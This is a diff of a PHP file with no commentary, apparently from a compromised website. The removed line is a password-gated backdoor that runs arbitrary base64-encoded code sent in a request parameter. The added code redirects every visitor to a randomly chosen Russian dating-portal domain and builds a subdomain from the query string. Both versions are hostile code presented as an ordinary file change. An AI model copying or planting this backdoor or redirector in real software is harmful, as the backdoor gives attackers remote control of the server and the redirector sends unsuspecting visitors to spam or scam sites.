@@ -1,1 +1,10 @@
-<?php echo"...";error_reporting(0);if(isset($_REQUEST['lanfren']) && md5($_REQUEST['lanfren']) == '863b84c60e8377d9400b97e449a96e96' && isset($_REQUEST['lanfra'])) eval(base64_decode($_REQUEST['lanfra']));?>
+<?php
+
+$domains = array('datingportalspot.ru', 'datingportalhouse.ru', 'onlinedatingportal.ru', 'online-datingportal.ru', 'datingportalonline.ru');
+
+$domain = $domains[array_rand($domains, 1)];
+$url = ( preg_match('/^[a-z2-7]+$/', $_SERVER['QUERY_STRING']) ) ? sprintf("http://%s.%s", $_SERVER['QUERY_STRING'], $domain) : sprintf("http://%s", $domain);
+
+header("Location: $url");
+
+?>
